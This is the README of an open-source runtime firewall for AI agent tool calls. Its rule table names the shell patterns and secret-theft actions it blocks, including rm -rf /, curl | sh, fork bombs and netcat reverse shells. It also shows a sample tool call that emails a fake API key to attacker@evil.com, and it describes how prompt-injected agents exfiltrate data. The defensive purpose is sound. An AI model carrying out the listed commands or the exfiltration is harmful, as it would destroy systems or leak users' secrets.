# agent-firewall

[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
[![Node.js >=20](https://img.shields.io/badge/node-%3E%3D20-brightgreen.svg)](https://nodejs.org/)

Runtime defensive middleware for AI agent tool calls. Detects, logs, and blocks suspicious patterns at call time — exfiltration trails, dangerous shell, sensitive path writes, the lethal trifecta in motion.

> **Static analysis vs. runtime defense.** [`mcp-audit`](https://github.com/abregoarthur-star/mcp-audit) inspects MCP server *definitions* before deployment. [`prompt-eval`](https://github.com/abregoarthur-star/prompt-eval) scores defense posture against an *attack corpus*. `agent-firewall` watches *every actual tool call* in production and blocks the ones that match policy. Three complementary layers; this one is the goalkeeper.

## What it catches

| Rule | Severity | Default verdict | What it catches |
|------|----------|-----------------|------------------|
| `secret-egress` | critical | block | Tool args containing API keys, GitHub PATs, AWS keys, JWTs, PEM private keys |
| `exfil-trail` | high | block | Cross-tool sequences in a session: sensitive read followed by an outbound send (the classic prompt-injection exfil) |
| `lethal-trifecta-runtime` | critical | block | A session that has now exercised every capability in a forbidden combo (shell-exec + network-egress, secret-read + network-egress, etc.) |
| `dangerous-shell` | critical/high | block | rm -rf /, curl \| sh, fork bombs, mkfs, base64-decode-and-exec, netcat reverse shells |
| `path-allowlist` | critical/high | block | File operations targeting paths outside allowed roots or in explicit blocklist (e.g. `/.ssh`, `/etc`) |
| `url-allowlist` | high/critical | block | Network calls to non-allowlisted hosts or non-allowed schemes |
| `recipient-allowlist` | critical | block | Email/Telegram tool calls to recipients not on the allowlist |
| `rate-limits` | high | block | Same tool fired N times in a window — runaway loops or repetitive abuse |
| `destructive-no-consent` | high | block | Destructive tools (`delete_*`, `drop_*`, `kill_*`) called without an explicit `confirm: true` arg |

Every rule is a pure function. Add your own in `src/rules/`.

## Install

```bash
npm install @dj_abstract/agent-firewall
```

Requires Node.js 20+.

## Quickstart — generic

```javascript
import { createFirewall } from '@dj_abstract/agent-firewall';

const firewall = createFirewall({
  mode: 'enforce',                              // 'observe' to only log
  policy: {
    url:  { allowedHosts: ['api.github.com'], allowedSchemes: ['https'] },
    fs:   { allowedRoots: ['/workspace', '/tmp'], blockedPaths: ['/.ssh', '/etc'] },
    recipients: { allowedEmails: ['arthur@gmail.com'] },
    rateLimits: { perTool: { count: 12, windowMs: 60_000 } },
  },
  onDecision: ({ ctx, decision }) => {
    if (decision.verdict !== 'allow') console.warn('[firewall]', decision.verdict, ctx.toolName, decision.findings.map(f => f.title));
  },
});

// Before executing a tool call:
const decision = await firewall.evaluate({
  toolName: 'send_email',
  args: { to: 'attacker@evil.com', body: 'sk-ant-api03-xxxx' },
  sessionId: 'session-42',
  caps: ['email_send', 'network_out'],
});

if (decision.verdict === 'block') {
  // refuse to run the tool, return the firewall message to the model
}
```

## Anthropic Agent SDK adapter

If you use [`@anthropic-ai/claude-agent-sdk`](https://www.npmjs.com/package/@anthropic-ai/claude-agent-sdk), wrap your MCP tools in one line:

```javascript
import { tool, createSdkMcpServer } from '@anthropic-ai/claude-agent-sdk';
import { createFirewall } from '@dj_abstract/agent-firewall';
import { wrapMcpTool } from '@dj_abstract/agent-firewall/adapters/agent-sdk';

const firewall = createFirewall({ mode: 'enforce', policy: { /* ... */ } });

const sendEmail = tool('send_email', '...', { to: z.string(), body: z.string() }, async args => { /* ... */ });
const guardedSendEmail = wrapMcpTool(sendEmail, firewall);

export const myServer = createSdkMcpServer({
  name: 'my-tools',
  version: '1.0.0',
  tools: [guardedSendEmail, /* ... */],
});
```

The adapter automatically infers capability tags (`secret_read`, `network_out`, `shell_exec`, etc.) from each tool's name using the same token-based classifier that powers `mcp-audit`. Override per-tool with `wrapMcpTool(t, firewall, { caps: ['secret_read'] })`.

## Modes

- **`observe`** — never blocks; the call always proceeds. Findings are still emitted to `onDecision`. Use this to gather a baseline before turning enforcement on.
- **`enforce`** — calls flagged with `verdict: 'block'` are stopped before reaching the tool handler. The wrapped tool returns a structured error to the model so it sees the refusal as a normal tool result.

## Sessions

Pass `sessionId` on every call. Cross-tool rules (exfil-trail, lethal-trifecta-runtime, rate-limits) need it to correlate. If omitted, all calls land in a shared `'default'` session — fine for tests, dangerous in production multi-tenant systems.

## Custom rules

Each rule is `{ id, check(ctx, session, policy) -> Finding[] | Finding | null }` returning zero or more findings. Add to the registry in `src/rules/index.js`, or compose your own ruleset and pass via `createFirewall({ rules: [...] })`.

## Threat model

**This is defense-in-depth, not a perimeter.** It cannot:
- Prevent prompt injection from reaching the model (use system-prompt hardening + [`prompt-eval`](https://github.com/abregoarthur-star/prompt-eval) for that)
- Catch attacks the LLM laundering through allowed channels (e.g., embedding secrets in *content* the model paraphrases — though `secret-egress` catches the literal patterns)
- Sandbox the actual tool implementations (use OS/container isolation for that)

It *does* catch the most common runtime mistakes that prompt-injected agents make: exfil to attacker URLs, dumping secrets into outbound channels, runaway loops, destructive calls without consent. Combined with [`mcp-audit`](https://github.com/abregoarthur-star/mcp-audit) (catches the design-time risks) and [`prompt-eval`](https://github.com/abregoarthur-star/prompt-eval) (catches the model-side weaknesses), it closes a real loop.

## References

- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [The Lethal Trifecta — Simon Willison](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- [Tool Poisoning Attacks — Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [MITRE ATLAS](https://atlas.mitre.org/)

## Related tools

Part of a **detect → inventory → test → generate → defend** pipeline for AI-agent security:

| Layer | Tool | Role |
|---|---|---|
| Detect | [`@dj_abstract/mcp-audit`](https://github.com/abregoarthur-star/mcp-audit) | Static audit of MCP server definitions |
| Detect | [`mcp-audit-sweep`](https://github.com/abregoarthur-star/mcp-audit-sweep) | Reproducible sweep of public MCP servers |
| Inventory | [`@dj_abstract/agent-capability-inventory`](https://github.com/abregoarthur-star/agent-capability-inventory) | Fleet-wide tool catalog with data-sensitivity tags |
| Test | [`prompt-eval`](https://github.com/abregoarthur-star/prompt-eval) | Runtime prompt-injection eval harness |
| Generate | [`@dj_abstract/prompt-genesis`](https://github.com/abregoarthur-star/prompt-genesis) | Attack corpus generator — produces the hardened attacks that prompt-eval validates defenses against |
| Defend | **agent-firewall** *(you are here)* | Call-time defensive middleware |

The full loop: `mcp-audit` catches design-time risks in the server surface; `agent-capability-inventory` maps what each tool touches; `prompt-genesis` generates adversarial attacks; `prompt-eval` measures how well the system resists them; `agent-firewall` catches what gets through at call time.

## License

MIT — see [LICENSE](./LICENSE).
